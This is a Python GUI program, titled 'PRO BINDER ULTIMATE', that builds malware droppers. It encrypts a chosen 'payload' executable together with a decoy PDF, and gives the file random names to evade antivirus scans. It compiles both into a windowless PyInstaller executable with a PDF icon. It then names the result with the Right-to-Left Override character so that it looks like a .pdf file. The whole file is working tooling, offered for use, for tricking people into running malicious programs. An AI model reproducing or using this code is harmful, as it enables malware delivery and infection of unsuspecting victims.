import customtkinter as ctk
from tkinter import filedialog, messagebox
import os
import subprocess
import shutil
import threading
import sys
import random
import string
from cryptography.fernet import Fernet
from PIL import Image

# Thiết lập theme
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

def get_script_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

class ProBinderApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("PRO BINDER ULTIMATE v3.0 - Private Edition")
        self.geometry("700x650")
        self.resizable(False, False)

        # Biến
        self.exe_path = ctk.StringVar()
        self.pdf_path = ctk.StringVar()
        self.icon_path = ctk.StringVar(value=os.path.join(get_script_dir(), "pdf_icon.ico"))
        self.output_name = ctk.StringVar(value="Document_Update_2026")

        self.setup_ui()

    def setup_ui(self):
        # Header với Gradient-like feel
        header_frame = ctk.CTkFrame(self, fg_color="transparent")
        header_frame.pack(pady=20, padx=20, fill="x")

        self.logo_label = ctk.CTkLabel(header_frame, text="☢ PRO BINDER ULTIMATE ☢", 
                                      font=ctk.CTkFont(size=32, weight="bold"), text_color="#3498db")
        self.logo_label.pack()

        self.sub_label = ctk.CTkLabel(header_frame, text="Advanced PDF Spoofing & Payload Binding", 
                                       font=ctk.CTkFont(size=14, slant="italic"), text_color="#bdc3c7")
        self.sub_label.pack()

        # Main Container
        main_frame = ctk.CTkFrame(self, corner_radius=15)
        main_frame.pack(pady=10, padx=40, fill="both", expand=True)

        # Payload Section
        self.create_input_group(main_frame, "Payload Executable (.exe)", self.exe_path, self.browse_exe, "Browse EXE")
        
        # PDF Section
        self.create_input_group(main_frame, "Bait Document (.pdf)", self.pdf_path, self.browse_pdf, "Browse PDF")

        # Icon Section
        self.create_input_group(main_frame, "Application Icon (.ico)", self.icon_path, self.browse_icon, "Change Icon")

        # Output Name Section
        name_label = ctk.CTkLabel(main_frame, text="Output Filename (Auto-RLO applied):", font=ctk.CTkFont(size=14, weight="bold"))
        name_label.pack(anchor="w", padx=25, pady=(15, 0))
        self.name_entry = ctk.CTkEntry(main_frame, textvariable=self.output_name, width=550, height=40, corner_radius=10)
        self.name_entry.pack(pady=10, padx=25)

        # Build Options (Checkbox)
        options_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        options_frame.pack(pady=10, padx=25, fill="x")
        
        self.use_rlo = ctk.CTkCheckBox(options_frame, text="Use RLO Trick (filename‮fdp.exe)", font=ctk.CTkFont(size=12))
        self.use_rlo.select()
        self.use_rlo.pack(side="left")

        # Build Button
        self.build_btn = ctk.CTkButton(self, text="BUILD UNDETECTABLE BINDER", 
                                       command=self.start_build, 
                                       height=60, 
                                       corner_radius=10,
                                       font=ctk.CTkFont(size=18, weight="bold"),
                                       fg_color="#e74c3c", hover_color="#c0392b")
        self.build_btn.pack(pady=20, padx=40, fill="x")

        # Status Bar
        self.status_bar = ctk.CTkLabel(self, text="Status: Ready to deploy.", font=ctk.CTkFont(size=12), text_color="#95a5a6")
        self.status_bar.pack(side="bottom", pady=5)

    def create_input_group(self, parent, label_text, var, command, btn_text):
        label = ctk.CTkLabel(parent, text=label_text, font=ctk.CTkFont(size=14, weight="bold"))
        label.pack(anchor="w", padx=25, pady=(15, 0))
        
        frame = ctk.CTkFrame(parent, fg_color="transparent")
        frame.pack(fill="x", padx=25, pady=5)
        
        entry = ctk.CTkEntry(frame, textvariable=var, width=420, height=35, corner_radius=8)
        entry.pack(side="left", fill="x", expand=True)
        
        btn = ctk.CTkButton(frame, text=btn_text, command=command, width=100, height=35, corner_radius=8)
        btn.pack(side="right", padx=(10, 0))

    def browse_exe(self): self.exe_path.set(filedialog.askopenfilename(filetypes=[("Executable", "*.exe")]))
    def browse_pdf(self): self.pdf_path.set(filedialog.askopenfilename(filetypes=[("PDF Document", "*.pdf")]))
    def browse_icon(self): self.icon_path.set(filedialog.askopenfilename(filetypes=[("Icon", "*.ico")]))

    def log(self, msg, color=None):
        self.status_bar.configure(text=f"Status: {msg}")
        if color: self.status_bar.configure(text_color=color)
        self.update()

    def start_build(self):
        if not self.exe_path.get() or not self.pdf_path.get():
            messagebox.showerror("Missing Files", "Please select both a Payload (EXE) and a Bait (PDF) file!")
            return
        
        self.build_btn.configure(state="disabled", text="⚡ BUILDING PACKAGE... ⚡", fg_color="#34495e")
        threading.Thread(target=self.build_process, daemon=True).start()

    def build_process(self):
        try:
            script_dir = get_script_dir()
            stub_path = os.path.join(script_dir, "advanced_stub.py")
            version_info_path = os.path.join(script_dir, "version_info.txt")
            
            if not os.path.exists(stub_path):
                raise Exception("Stub template (advanced_stub.py) not found!")

            self.log("Encrypting files with military-grade AES...", "#f1c40f")
            
            # Mã hóa
            key = Fernet.generate_key()
            cipher = Fernet(key)
            
            encrypted_files = []
            for file_path in [self.exe_path.get(), self.pdf_path.get()]:
                with open(file_path, "rb") as f:
                    data = f.read()
                enc_data = cipher.encrypt(data)
                
                # Tạo tên file mã hóa ngẫu nhiên để tránh heuristic scan
                rand_name = "data_" + ''.join(random.choices(string.ascii_lowercase, k=6)) + ".bin"
                enc_full_path = os.path.join(script_dir, rand_name)
                with open(enc_full_path, "wb") as f:
                    f.write(enc_data)
                encrypted_files.append(enc_full_path)

            exe_f_enc, pdf_f_enc = encrypted_files[0], encrypted_files[1]
            
            self.log("Preparing deployment script...", "#f1c40f")
            
            # Đọc stub
            with open(stub_path, "r", encoding="utf-8") as f:
                stub_content = f.read()
            
            # Replace placeholders
            stub_content = stub_content.replace("[[PDF_NAME_ORIG]]", os.path.basename(self.pdf_path.get()))
            stub_content = stub_content.replace("[[EXE_NAME_ORIG]]", os.path.basename(self.exe_path.get()))
            stub_content = stub_content.replace("[[PDF_NAME_ENC]]", os.path.basename(pdf_f_enc))
            stub_content = stub_content.replace("[[EXE_NAME_ENC]]", os.path.basename(exe_f_enc))
            stub_content = stub_content.replace("[[ENCRYPTION_KEY]]", key.decode())

            temp_build_py = os.path.join(script_dir, "temp_compiler.py")
            with open(temp_build_py, "w", encoding="utf-8") as f:
                f.write(stub_content)

            self.log("Invoking PyInstaller... This might take 30-60 seconds.", "#f39c12")
            
            # Cấu hình command build
            cmd = [
                "pyinstaller", "--onefile", "--noconsole", "--clean",
                f'--add-data={exe_f_enc};.',
                f'--add-data={pdf_f_enc};.',
                f'--name=final_build'
            ]
            
            if os.path.exists(version_info_path):
                cmd.append(f'--version-file={version_info_path}')
            
            if self.icon_path.get() and os.path.exists(self.icon_path.get()):
                cmd.append(f'--icon={self.icon_path.get()}')

            cmd.append(temp_build_py)

            # Chạy build
            process = subprocess.run(cmd, capture_output=True, text=True, cwd=script_dir)
            
            if process.returncode == 0:
                output_dir = os.path.join(script_dir, "output")
                os.makedirs(output_dir, exist_ok=True)
                
                # Xử lý tên file RLO
                base_name = self.output_name.get()
                if self.use_rlo.get():
                    # Ký tự RLO: \u202e
                    final_name = f"{base_name}\u202efdp.exe"
                else:
                    final_name = f"{base_name}.exe"
                
                source_exe = os.path.join(script_dir, "dist", "final_build.exe")
                dest_exe = os.path.join(output_dir, final_name)
                
                if os.path.exists(dest_exe): os.remove(dest_exe)
                shutil.move(source_exe, dest_exe)
                
                self.log("SUCCESS! File saved in 'output' folder.", "#2ecc71")
                messagebox.showinfo("Success", f"Build Complete!\nSaved as: {final_name}\nLocation: /output/")
            else:
                self.log("BUILD FAILED! Check logs.", "#e74c3c")
                print(process.stderr)
                messagebox.showerror("Build Error", "PyInstaller encountered an error. See console for details.")

            # Cleanup
            for f in encrypted_files:
                if os.path.exists(f): os.remove(f)
            if os.path.exists(temp_build_py): os.remove(temp_build_py)
            
        except Exception as e:
            self.log(f"CRITICAL ERROR: {str(e)}", "#e74c3c")
            messagebox.showerror("Error", str(e))
        finally:
            self.build_btn.configure(state="normal", text="BUILD UNDETECTABLE BINDER", fg_color="#e74c3c")

if __name__ == "__main__":
    app = ProBinderApp()
    app.mainloop()
